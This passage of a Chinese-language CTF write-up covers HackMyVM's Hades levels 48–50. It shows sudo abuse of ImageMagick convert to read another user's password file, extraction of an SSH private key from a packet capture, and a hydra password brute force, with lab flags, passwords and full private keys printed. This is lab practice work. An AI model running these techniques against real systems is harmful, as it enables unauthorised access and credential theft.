                       removes noise from the image using a wavelet transform
  -white-threshold value
                       force all pixels above the threshold into white

Image Sequence Operators:
  -append              append an image sequence
  -clut                apply a color lookup table to the image
  -coalesce            merge a sequence of images
  -combine             combine a sequence of images
  -compare             mathematically and visually annotate the difference between an image and its reconstruction
  -complex operator    perform complex mathematics on an image sequence
  -composite           composite image
  -copy geometry offset
                       copy pixels from one area of an image to another
  -crop geometry       cut out a rectangular region of the image
  -deconstruct         break down an image sequence into constituent parts
  -evaluate-sequence operator
                       evaluate an arithmetic, relational, or logical expression
  -flatten             flatten a sequence of images
  -fx expression       apply mathematical expression to an image channel(s)
  -hald-clut           apply a Hald color lookup table to the image
  -layers method       optimize, merge, or compare image layers
  -morph value         morph an image sequence
  -mosaic              create a mosaic from an image sequence
  -poly terms          build a polynomial from the image sequence and the corresponding
                       terms (coefficients and degree pairs).
  -print string        interpret string and print to console
  -process arguments   process the image with a custom image filter
  -separate            separate an image channel into a grayscale image
  -smush geometry      smush an image sequence together
  -write filename      write images to this file

Image Stack Operators:
  -clone indexes       clone an image
  -delete indexes      delete the image from the image sequence
  -duplicate count,indexes
                       duplicate an image one or more times
  -insert index        insert last image into the image sequence
  -reverse             reverse image sequence
  -swap indexes        swap two images in the image sequence

Miscellaneous Options:
  -debug events        display copious debugging information
  -distribute-cache port
                       distributed pixel cache spanning one or more servers
  -help                print program options
  -list type           print a list of supported option arguments
  -log format          format of debugging information
  -version             print version information

By default, the image format of `file' is determined by its magic
number.  To specify a particular image format, precede the filename
with an image format name and a colon (i.e. ps:image) or specify the
image type as the filename suffix (i.e. image.ps).  Specify 'file' as
'-' for standard input or output.
```

尝试了很多都没有成功，后来师傅提示了！
> Phantim Engage:这个convert是imagemagick的组件
> 用来转换图像格式的
> sudo -u rhea convert TEXT:/pwned/rhea/flagz.txt /var/tmp/aaaa.png
> 直接到 imagemagick 官网查看一下命令即可

尝试找了一下，在 https://imagemagick.org/discourse-server/viewtopic.php?t=36416 发现：
```plaintext
magick TEXT:fxDtable.txt fxDtable.jpg
```

ok，尝试获取密码：

```bash
phoebe@hades:/var/tmp$ sudo -u rhea /usr/bin/convert TEXT:/usr/sbin/re /var/tmp/pazz.jpg
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
phoebe@hades:/var/tmp$ ls | grep pazz
pazz.jpg
```
传到本地看一下：`hgbe02@pwn:/mnt/c/Users/Administrator/Desktop$ scp -P 6666 phoebe@hades.hackmyvm.eu:/var/tmp/pazz.jpg .` 截图ocr一下，发现密码`iKVVfwEDFbBpTnlnKZKr`

后面我不太确定，问了一下大佬：
> me:这个convert那个读文件的文档你们截过图吗
> me:我没找到
> dalao_Phantom Engage:https://legacy.imagemagick.org/Usage/text/
> dalao_Phantom Engage:convert是ImageMagick6的组件，7开始不分组件全都用magick当命令行了，所以要查legacy版本的文档
> text:这个输入格式本质上是把文本转换成“包含文本的页面”图像，所以不加任何参数输出来的图像比例和书页是一致的

大佬牛逼，我去翻了一下，发现是有相关描述的！

## 49 rhea
```bash
rhea@hades:~$ sudo -l
[sudo] password for rhea: 
Sorry, user rhea may not run sudo on hades.
rhea@hades:~$ ls -la
total 36
drwxr-x--- 2 root rhea 4096 Apr  5 06:36 .
drwxr-xr-x 1 root root 4096 Apr  5 06:36 ..
-rw-r--r-- 1 rhea rhea  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 rhea rhea 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 rhea rhea  807 Apr 23  2023 .profile
-rw-r----- 1 root rhea 3972 Apr  5 06:36 capture.pcapng
-rw-r----- 1 root rhea   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root rhea  156 Apr  5 06:36 mission.txt
rhea@hades:~$ cat flagz.txt 
^WjwTEPwuQiQihkrexbg^
rhea@hades:~$ cat mission.txt 
################
# MISSION 0x49 #
################

## EN ##
User selene wants to tell us something...

## ES ##
La usuaria selene nos quiere decir algo...
```
发现一个数据流文件，下载到本地进行查看一下：

```bash
hgbe02@pwn:/mnt/c/Users/Administrator/Desktop$ scp -P 6666 rhea@hades.hackmyvm.eu:/pwned/rhea/capture.pcapng .

                                                      .     **                                   
                                                   *           *.                                 
                                                                  ,*                              
                                                                     *,                            
                                             ,                         ,*                         
                                          .,                              *,                       
                                       /                                    *                    
                                    ,*                                        *,                  
                                 /.                                            .*.                 
                                                                _____
                __     __           _____         ____________      _____\    \            _____
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    |
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/|
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   ||
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/
                                                                        |___|/

                                       **                                    **.
                                          ,*                                **
                                             *,                          ,*
                                                *                      **
                                                *,                .*
                                                   *.           **
                                                      **      ,*,
                                                         ** *,
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+


rhea@hades.hackmyvm.eu's password: 
capture.pcapng                                                                                                                                      100% 3972    14.2KB/s   00:00    
```

查看一下：
```bash
rhea@hades:/var/tmp$ history | tail -n 5
    7  clear
    8  wget http://127.0.0.1/id.zip
    9  unzip id.zip.1
   10  clear
   11  history | tail -n 5
```
重命名为`test`，别人做过了，尝试看一下：

```bash
rhea@hades:/var/tmp$ cat test

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAp13lq0MUF/gwnHU9D9UnwaNw1LzQBR8mkvQbeocYU8v+YfZC2rNr
JD/TfIRq3n2raUGuO1h33nD1FrIZ2nSBXXZ9V7KJstEzXDnRthyNGfSvV6g0/iyVJHuUBG
KzQVQDyKHb4s/P/JkNDe5Keum6kcGk3vSIfzQjotytPrgHXa0GiY53Wcxr5rcwXHjTPvjH
1x414tioA26TAuKVuOcp2YlEaSKD6We9vIJuGf8ueKXqg53qScKPLuo8RvE1kzja29uagG
lWYTHNJWJYdv8SkNhYSbbvxqpDkXottul5BsyN52A5kdQ0LgX93ZsByNM1SQkdgAarCPNQ
ZBCiyi56FwAAA8gdnlFTHZ5RUwAAAAdzc2gtcnNhAAABAQCnXeWrQxQX+DCcdT0P1SfBo3
DUvNAFHyaS9Bt6hxhTy/5h9kLas2skP9N8hGrefatpQa47WHfecPUWshnadIFddn1Xsomy
0TNcOdG2HI0Z9K9XqDT+LJUke5QEYrNBVAPIodviz8/8mQ0N7kp66bqRwaTe9Ih/NCOi3K
0+uAddrQaJjndZzGvmtzBceNM++MfXHjXi2KgDbpMC4pW45ynZiURpIoPpZ728gm4Z/y54
peqDnepJwo8u6jxG8TWTONrb25qAaVZhMc0lYlh2/xKQ2FhJtu/GqkORei226XkGzI3nYD
mR1DQuBf3dmwHI0zVJCR2ABqsI81BkEKLKLnoXAAAAAwEAAQAAAQEAnVPw34sQym9uEsVK
fyWaV7ZyDCjpSsc7lYyOgCGaRrtOB3xc4AUkxFCTV0uKwldT2H/7bqH9HEcGvSzyjJ5UNS
17KgMU2dk59IoNjqlMIogWg8oE9qGmGUNpoq29X73ASMuOTamYFBUzZlMIBH7N+NIVT9iC
r0Ct9xyGZpzLn8vO1QF1P6LIfMwKXRH6HDrvII8i1uh+JeJShAc8mKhYW7wnSZC3QK6VLl
OMMizJGNmq5reJ9V7TPQidozYVbS78Fc+QCZokpauMmfI6+rGiX2/yQllaNZ7AJ1PInRYP
y20TvYvRsH9r4hQ/r6V8+MJxl26u7Ddez6UVJAaO+N7y8QAAAIEApBDOwKgqAt+frRk8l7
YEfxIZPwItRje3n7WJ6JE2NJopwl9+/gAisX0S7tinrymabZ5Pk2c2jCwjeeAg2vygUzkF
hOeMO9qcIZ2TuE7soYzjR+pdNaElX9gwZW6IGl3m1thMnbB9kpI/HNIYercfUL2eu41O0c
gypFbA/OvTsU8AAACBANoopFZZLbfXAoUJdoxULehMoeC8reeAJNQ5CaWKpdPx7M3IN/4g
IIo7N1FCOHvQocUl6QYoHCZTZiKvMfyEGuRt9rJ5uS1iBGpGn0puF44sI1DZ3b0etLGFmC
raGuxRgQQrYTUI8yqFH764iQuQCf5p+uOAg4Kq3dbHCj/h5qgFAAAAgQDEZdVZxP0/Vjiq
hZRE8lWcACRF5gBg9grwNBg/dWaWyZT0VPAjKd4rO2EXv9yXfVQOXCRv28TXbQ6F7yDypv
8j/pipuRJzrdrCIa1795182/mpW0W18GJzxyKx61TZi1zxyLJvpvwYq9lmJfAb6R7OftkC
sZrdRkYOo7MoNcFAawAAAA1zbWxAY2Fzc2FuZHJhAQIDBA==
-----END OPENSSH PRIVATE KEY-----

rhea@hades:/var/tmp$ chmod 600 test
rhea@hades:/var/tmp$ ssh selene@0.0.0.0 -i  test
The authenticity of host '0.0.0.0 (0.0.0.0)' can't be established.
ED25519 key fingerprint is SHA256:5QshhvvnibVTWOxgK9XbUejVSLahU6clfnK1Iku0wsg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/pwned/rhea/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/pwned/rhea/.ssh/known_hosts).

                                                      .     **                                   
                                                   *           *.                                 
                                                                  ,*                              
                                                                     *,                            
                                             ,                         ,*                         
                                          .,                              *,                       
                                       /                                    *
                                    ,*                                        *,
                                 /.                                            .*.
                                                                _____
                __     __           _____         ____________      _____\    \            _____
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    |
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/|
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   ||
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/
                                                                        |___|/

                                       **                                    **.
                                          ,*                                **
                                             *,                          ,*
                                                *                      **
                                                *,                .*
                                                   *.           **
                                                      **      ,*,
                                                         ** *,
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+


Load key "test": error in libcrypto
selene@0.0.0.0's password:
```
嘶。。。。还是老实点吧，哈哈哈，先追踪http流，发现存在id_rsa字样，同时有id.zip的传递，选中该http请求后，选择Media Type，右键选择 导出分组字节流 即可将响应体内容导出：
保存类型为`ALL file`，然后保存为一个压缩包，解压后得到一个`id_rsa`文件：
```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA6m8jc3NEzQBue8NzNmhxHNVfgCmx+EumEFhq0amDaepnME4N8DWC
O/tHCAh8np089DlUDHpe/8T06muybeN02U8ULr1HJGl03q4nAcHi+tA82ES3MJaWu97BmS
qsEWxDZvYVgySjsG7bbEPE/OuYlWDXfj9QSnD4QNccrt9BmFp3HLGdDt+bbkuQZ6ElN1Qd
m9PFN9GYfM3g0/sM68jtw2XHO7KWKucaod1BOERknGxaM3FqHl+6Rpk3piQthoC+Nuqe5f
jm3rgu4sqXLAd7iFf+NBKDfTmfzwxxH/bIR/Cl1mJwHcC75IceW5OC2wtu938JflO6VFcT
58a0S+GcZwAAA8iJKHc6iSh3OgAAAAdzc2gtcnNhAAABAQDqbyNzc0TNAG57w3M2aHEc1V
+AKbH4S6YQWGrRqYNp6mcwTg3wNYI7+0cICHyenTz0OVQMel7/xPTqa7Jt43TZTxQuvUck
aXTericBweL60DzYRLcwlpa73sGZKqwRbENm9hWDJKOwbttsQ8T865iVYNd+P1BKcPhA1x
yu30GYWnccsZ0O35tuS5BnoSU3VB2b08U30Zh8zeDT+wzryO3DZcc7spYq5xqh3UE4RGSc
bFozcWoeX7pGmTemJC2GgL426p7l+ObeuC7iypcsB3uIV/40EoN9OZ/PDHEf9shH8KXWYn
AdwLvkhx5bk4LbC273fwl+U7pUVxPnxrRL4ZxnAAAAAwEAAQAAAQAVYlHfhBIwiOuLCocF
3X0D3kq5zBPZzDy3nPkRat772E/VTiljUd4xTnhqOSv04+7dcCVEhh0IQ5T7lRtPfsH32I
jEwqssnRn1/fi85kyoCDqkl5AGNJZHSMhsCkJrzG5Rg/zuW3c67sHBHGVplKv0ZEMD1w6h
27ApafXJ1b+L//fHjLbq+HVdrRTF2XmVXSgWj2NpjhdRUzfrcSNz+QgBnltzaY8YJYTsOD
jcLClwnOgCpWS+YghzQUDMr+uoIeSGNTM08q2Y+cPKUPNJ4+J/cA1vDsZiA79jxSrEdII4
BJ9GPbOHempz07SN7hy46Z5cpLuSN0xmTkbkzftSvQShAAAAgQDV42e8bUweH17x+NLduU
CrfIEJmwaJ8xaER4SizExG6R2aGyqXlefPVeZDnRtLR70y4NEPCbOVlmlk+t6n0gn3Pjxt
WdPXE5O18uwwSSjs182DcVqB6NWq2SrKLPSDVQIHNjaFVyLhHav7k2sIokAgMx9/oojNBd
qMuXTseyeyjQAAAIEA/quM6uiMpyjTKegVGt/pCeXFKwK3vKQpyY/gwrtJKMbG4tIWCnBC
ah891PHlq/hQbsrw0QIw/xpmh0YnxB8fsYbqhIh6zWXsyx0pIZUqSg7BA1Tx5ZJtWZg6VM
T2vioJQ9tTerPDUDY0b2f69odG0t+S6OP1WxyHJvyoZsLYHh8AAACBAOuoiTnUIRfPLBHA
zLp7cbH/6FG1l+TzKzBrBuUp4i3gg0Sautfh1/JMcc/zl0Pe2SxvCX0c64xEtLMIVn9/ov
hMk1sbuGbpcrY/N99/xk8NZMDXPSlROgOZ5BLdYu7xrHzWRiAZ/2S7rV4dtLK9L3FuCWjZ
SD+hjsg3DNNJISi5AAAADXNtbEBjYXNzYW5kcmEBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----

```

## 50 selene
```bash
e@hades:~$ ls -la
total 36
drwxr-x--- 3 root   selene 4096 Apr  5 06:36 .
drwxr-xr-x 1 root   root   4096 Apr  5 06:36 ..
-rw-r--r-- 1 selene selene  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 selene selene 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 selene selene  807 Apr 23  2023 .profile
drwxr-xr-x 2 root   root   4096 Apr  5 06:36 .ssh
-rw-r----- 1 root   selene   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root   selene  174 Apr  5 06:36 mission.txt
selene@hades:~$ cat flagz.txt 
^VgZLrvZyzGYvqegkslh^
selene@hades:~$ cat mission.txt 
################
# MISSION 0x50 #
################

## EN ##
The user maria ... I think I have seen her password.

## ES ##
La usuaria maria... creo haber visto su password.
```

将之前找到的所有密码放入进行尝试爆破：
```Plain Text
acantha
aegle
alala
althea
andromeda
anthea
aphrodite
arete
ariadne
artemis
asia
asteria
astraea
atalanta
athena
aura
calliope
calypso
cassandra
cassiopeia
clio
cybele
cynthia
daphne
delia
demeter
echo
eos
executor
gaia
gemini
hacker
halcyon
hebe
hera
hermione
hero
hestia
ianthe
irene
iris
kore
leda
maia
maria
nephele
nyx
pallas
pandora
penelope
phoebe
rhea
selene

mYYLhLBSkrzZqFydxGkn
DsYzpJQrCEndEWIMxWxu
ObxEmwisYjERrDfvSbdA
OTWGTbHzrxhYFSTlKcOt
yWFLtSNQArEBTHtWgkKd
HPJVaqRzieKQeyyATsFv
iNgNazuJrmhJKWixktzk
QjrIovHacmGWxVjXRLmA
HIiaojeORLaJBVSPDDCZ
djqWtkLisbQlrGtLYHCv
hawMVJCYrBgoDAMVhuwT
nZkEYtjvHElOtupXKzTE
mUcSNQlaXtwSvGcgeTYZ
kmQMpZsXgOsnzGReRcoV
TiqpedAFjwmVyBlYpzRh
YRturIymmHSdBmEClEGe
IlhyWxZuqIHAuqVOpXfQ
TAMYefoHcCPmexwImodo
CKzlnvmHQz
gRqFnHblmZVZSfegPLvO
cqJqRPaUtuoUYXbaxnZq
UICacOPmJMWbKyPwNZod
QHLjXdGSiRShtWpMwFjj
EkdtKuXCJjlFKFpKgddX
bNCvocyOpoMVeCtxrhTt
FkyuXkkJNONDChoaKzOI
GztROerShmiyiCIlfepG
CWBKRQX
sbUcegcdYTTWzTKojzgm
cuMRRameGdmhVxHcYYYs
tOlbuBLjFWntVDNmjHIG
JzpyRXRzWoHKZwgWzleM
vzhOebSSplFoXPKxwtqU
vlImTDSGnTMwLFgRWCOc
opTNnZQAuFJsauNPHXVq
DphioLqgVIIFclTwBsMP
TDyuLyWLDksEhgmAYDJC
FiqGNcXumTKwLTPRqXMh
mdAXiSXteTPiGGTpmajP
NODEVILINHELL
GIVEMEANEWMIND
rZtaitCxlEIRxBayVpgZ
HXisrOPSdTcSSTEyyaLn
wWxyXnNbmjxNMEAIjbjT
HhVHfmbBIiZbZSgcgadh
anoRxVKulaoMNKMrddVe
FPLwKmmKhcWAwRxiaBDN
iKVVfwEDFbBpTnlnKZKr
zZqEimsDlLPqIyqzNyWB
begood!
yWFLtSNQArEBTHtWgkKd
yABCtSNQArEBTHtWgkKd
YRturIymmHSdBmEClEGe
HIiaojeORLaJBVSPDDCZ
QHLjVBGSiRShtWpMwFjj
FkyuXkkJNONDChoaKzOI
NOP
kmQMpZsXgOsnzGReRcoZ
```
爆破失效：
```bash
hgbe02@pwn:~/temp$ hydra -l maria -P pass ssh://hades.hackmyvm.eu:6666
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-15 23:54:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 112 login tries (l:1/p:112), ~7 tries per task
[DATA] attacking ssh://hades.hackmyvm.eu:6666/
[STATUS] 99.00 tries/min, 99 tries in 00:01h, 16 to do in 00:01h, 16 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-15 23:55:23
```
后面进过提示，在hera用户下，之前存在一个没用上的密码：
```bash
hera@hades:~/.ssh$ ls -la
total 16
drwxr-xr-x 2 root root 4096 Apr  5 06:36 .
drwxr-x--- 3 root hera 4096 Apr  5 06:36 ..
-rw-r----- 1 root hera  568 Apr  5 06:36 authorized_keys
-rw-r----- 1 root hera 2590 Apr  5 06:36 id_rsa
hera@hades:~/.ssh$ cd ..
hera@hades:~$ ls -la
total 40
drwxr-x--- 3 root hera 4096 Apr  5 06:36 .
drwxr-xr-x 1 root root 4096 Apr  5 06:36 ..
-rw-r----- 1 root hera  127 Apr  5 06:36 .bash_history
-rw-r--r-- 1 hera hera  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 hera hera 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 hera hera  807 Apr 23  2023 .profile
drwxr-xr-x 2 root root 4096 Apr  5 06:36 .ssh
-rw-r----- 1 root hera   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root hera  182 Apr  5 06:36 mission.txt
hera@hades:~$ find / -user hera 2>/dev/null | grep -v proc
/dev/pts/12
/dev/pts/14
/dev/pts/8
/dev/pts/3
/pwned/hera/.bash_logout
/pwned/hera/.bashrc
/pwned/hera/.profile
hera@hades:~$ cat /dev/pts/12
^C
hera@hades:~$ env
SHELL=/bin/bash
PWD=/pwned/hera
LOGNAME=hera
MOTD_SHOWN=pam
HOME=/pwned/hera
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.
tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=0
1;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31
:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.avif=01;35:*
.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;3
5:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=0
1;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:
*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*
.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.swp=00;90:*.tmp=00;90:*.dpkg-dist=00;90:*.dpkg-old=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:
SSH_CONNECTION=39.144.156.223 26365 172.66.0.66 22
TERM=xterm-256color
USER=hera
SHLVL=1
SSH_CLIENT=39.144.156.223 26365 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
SSH_TTY=/dev/pts/14
_=/usr/bin/env
OLDPWD=/pwned/hera/.ssh
hera@hades:~$ set
BASH=/bin/bash
BASHOPTS=checkwinsize:cmdhist:complete_fullquote:expand_aliases:extquote:force_fignore:globasciiranges:globskipdots:histappend:hostcomplete:interactive_comments:login_shell:patsub_replacement:progcomp:promptvars:sourcepath
BASH_ALIASES=()
BASH_ARGC=([0]="0")
BASH_ARGV=()
BASH_CMDS=()
BASH_LINENO=()
BASH_LOADABLES_PATH=/usr/local/lib/bash:/usr/lib/bash:/opt/local/lib/bash:/usr/pkg/lib/bash:/opt/pkg/lib/bash:.
BASH_SOURCE=()
BASH_VERSINFO=([0]="5" [1]="2" [2]="15" [3]="1" [4]="release" [5]="x86_64-pc-linux-gnu")
BASH_VERSION='5.2.15(1)-release'
COLUMNS=182
DIRSTACK=()
EUID=2024
GROUPS=()
HISTCONTROL=ignoreboth
HISTFILE=/pwned/hera/.bash_history
HISTFILESIZE=2000
HISTSIZE=1000
HOME=/pwned/hera
HOSTNAME=hades
HOSTTYPE=x86_64
IFS=$' \t\n'
LINES=15
LOGNAME=hera
LS_COLORS='rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*
.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=
01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;3
1:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.avif=01;35:
*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;
35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=
01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35
:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:
*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.swp=00;90:*.tmp=00;90:*.dpkg-dist=00;90:*.dpkg-old=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:'
MACHTYPE=x86_64-pc-linux-gnu
MAILCHECK=60
MOTD_SHOWN=pam
OLDPWD=/pwned/hera/.ssh
OPTERR=1
OPTIND=1
OSTYPE=linux-gnu
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
PIPESTATUS=([0]="0")
PPID=688022
PS1='\[\e]0;\u@\h: \w\a\]${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
PS2='> '
PS4='+ '
PWD=/pwned/hera
SHELL=/bin/bash
SHELLOPTS=braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor
SHLVL=1
SSH_CLIENT='39.144.156.223 26365 22'
SSH_CONNECTION='39.144.156.223 26365 172.66.0.66 22'
SSH_TTY=/dev/pts/14
TERM=xterm-256color
UID=2024
USER=hera
_=env
hera@hades:~$ ls -la
total 40
drwxr-x--- 3 root hera 4096 Apr  5 06:36 .
drwxr-xr-x 1 root root 4096 Apr  5 06:36 ..
-rw-r----- 1 root hera  127 Apr  5 06:36 .bash_history
-rw-r--r-- 1 hera hera  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 hera hera 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 hera hera  807 Apr 23  2023 .profile
drwxr-xr-x 2 root root 4096 Apr  5 06:36 .ssh
-rw-r----- 1 root hera   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root hera  182 Apr  5 06:36 mission.txt
hera@hades:~$ find / -user group 2>/dev/null | grep -v proc
hera@hades:~$ find / -group hera 2>/dev/null | grep -v proc
/usr/hera
/pwned/hera
/pwned/hera/.bash_history
/pwned/hera/.bash_logout
/pwned/hera/.bashrc
/pwned/hera/.ssh/authorized_keys
/pwned/hera/.ssh/id_rsa
